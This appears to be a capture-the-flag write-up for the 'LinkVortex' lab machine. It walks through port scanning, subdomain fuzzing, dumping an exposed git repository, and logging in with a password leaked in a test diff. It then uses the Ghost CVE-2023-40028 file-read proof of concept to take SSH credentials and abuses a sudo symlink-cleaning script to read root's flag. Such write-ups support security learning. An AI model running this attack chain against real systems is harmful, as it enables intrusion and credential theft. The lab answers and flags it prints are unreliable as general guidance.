# LinkVortex

## Recon

First we will do nmap with target IP address:  
nmap -p- --min-rate 10000 10.129.231.194

We have 2 ports open   
Not shown: 65533 closed tcp ports (reset)  
PORT   STATE SERVICE  
22/tcp open  ssh  
80/tcp open  http  

Let's check out those ports:  
nmap -p 22,80 -sCV 10.129.231.194

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)  
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)  
80/tcp open  http    Apache httpd  
|_http-title: Did not follow redirect to http://linkvortex.htb/  
|_http-server-header: Apache  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

The OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 is likely correspond to Ubuntu 22.04 LTS (Jammy Jellyfish)

### Subdomain fuzz
Now I am doing subdomain fuzz

ffuf -u http://10.129.231.194 -H Host: FUZZ.linkvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

It finds dev.linkvortex.htb. I’ll add both to my /etc/hosts file:

10.129.231.194  linkvortex.htb dev.linkvortex.htb

Let's rerun nmap again with nmap -p 80 -sCV linkvortex.htb

PORT   STATE SERVICE VERSION  
80/tcp open  http    Apache httpd  
|_http-server-header: Apache  
|_http-title: BitByBit Hardware  
| http-robots.txt: 4 disallowed entries   
|_/ghost/ /p/ /email/ /r/  
|_http-generator: Ghost 5.58  

It shows robots.txt on linkvortex.htb

We have ghost verion:  
http-generator: Ghost 5.58

Ghost CMS robots.txt where .ghost is the login page

Now let's try nmap dev.linkvortex.htb

PORT   STATE SERVICE VERSION  
80/tcp open  http    Apache httpd  
|_http-title: Launching Soon  
|_http-server-header: Apache  
| http-git:   
|   10.129.231.194:80/.git/  
|     Git repository found!  
|     Repository description: Unnamed repository; edit this file 'description' to name the...  
|     Remotes:  
|_      https://github.com/TryGhost/Ghost.git  

Based on the result, it looks alike from legit Ghost repo


I check HTTP response 

curl -I http://linkvortex.htb
  
HTTP/1.1 200 OK  
Date: Tue, 21 Apr 2026 02:34:03 GMT  
Server: Apache  
X-Powered-By: Express  
Cache-Control: public, max-age=0  
Content-Type: text/html; charset=utf-8  
Content-Length: 12148  
ETag: W/"2f74-mqPay5p68HzCnSNfLEbtNlyqrd0"  
Vary: Accept-Encoding  

Now I enter URL http://dev.linkvortex.htb/

It has coming soon message.

Now let's do directory brute force

feroxbuster -u http://dev.linkvortex.htb

I use git dumper to collect all the resource

The contents of the ghost repo are now present in the source directory by ls source/

I check git status in sources directory

new file:   Dockerfile.ghost  
        modified:   ghost/core/test/regression/api/admin/authentication.test.js  

It is not currently in any branch but It has 2 awaiting modified files to commit. We can diff the file

git diff --cached Dockerfile.ghost 

This was likely created for LinkVortex. I’ll note that a config file is located at /var/lib/ghost/config.production.json

The diff on authentication.test.js is a shows a password change:  

#-            const password = 'thisissupersafe';  
#+            const password = 'OctopiFociPilfer45';

This file is a unit test for the Ghost framework. That line is present in the current Ghost code with the “thisissupersafe” password. The new password is likely useful.  

I’ll try these creds at /ghost, but they don’t work:

I’ll try admin@linkvortex.htb with the same password = OctopiFociPilfer45, and it works!

### Shells as bob
Knowing the Ghost version is 5.58, I’ll search for vulnerabilities in Ghost

=> CVE-2023-40028

Site administrators can check for exploitation of this issue by looking for unknown symlinks within Ghost’s content/ folder.

I find https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028 POC to do proof of concept

Then I do #./CVE-2023-40028 -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45' -h http://linkvortex.ht

The Dockerfile contains some interesting information. The configuration for the blog was not present in the repo but should be available at /var/lib/ghost/config.production.json

Then I harvest the bob credential:

"user": "bob@linkvortex.htb",
"pass": "fibber-talented-worth"

Then I use netexec

netexec ssh linkvortex.htb -u bob -p fibber-talented-worth 

SSH         10.129.231.194  22     linkvortex.htb   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10  
SSH         10.129.231.194  22     linkvortex.htb   [+] bob:fibber-talented-worth  Linux - Shell access!  

Let's try to connect with ssh using

"user": "bob@linkvortex.htb",
"pass": "fibber-talented-worth"

bob@linkvortex:~$ cat user.txt
fe6ca6cf0d7d7d17ac8402f951f4eab6

## Shell as root  
bob@linkvortex:~$ cat /etc/passwd | grep 'sh$'  
root:x:0:0:root:/root:/bin/bash  
bob:x:1001:1001::/home/bob:/bin/bash  

bob@linkvortex:~$ sudo -l => to see what i can run sudo

### Exploit clean_symlink.sh

bob@linkvortex:/$ sysctl fs.protected_symlinks  
fs.protected_symlinks = 1    
=> It’s worth noting that Protected Symlinks is enabled here (as is the default on Ubuntu):  

symlinks are permitted to be followed only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner.  

This protecting was developed specifically to address Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities. I need to avoid putting symlinks that I want to follow (like b above) in /tmp, /var/tmp, or /dev/shm, etc:

Then I do:  
### . [find / -type d -perm -0002 -perm -1000 2>/dev/null]

To exploit this, I’ll create the link b from the diagram

bob@linkvortex:~$ ls -l /home/bob/.cache/b  
lrwxrwxrwx 1 bob bob 14 Apr 21 03:41 /home/bob/.cache/b -> /root/root.txt  

Next I’ll create a.png, another link pointing to b:  

bob@linkvortex:~$ ln -s /home/bob/.cache/b /home/bob/.cache/a.png  
bob@linkvortex:~$ ls -l /home/bob/.cache/a.png  
lrwxrwxrwx 1 bob bob 18 Apr 21 03:44 /home/bob/.cache/a.png -> /home/bob/.cache/b  

So with the environment variable to get contents set, I check a.png:

CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/a.png 

Link found [ /home/bob/.cache/a.png ] , moving it to quarantine  
Content:  
1406baf6cfa075d02d97c06dcc1ce6cf  

Done

=> How TOCTOU works is the intended way to abuse this is with a time-of-check-time-of-use vulnerability. If I run a command between the time that it checks the target of the link and when it prints the contents of the file, I can change the target of the link.







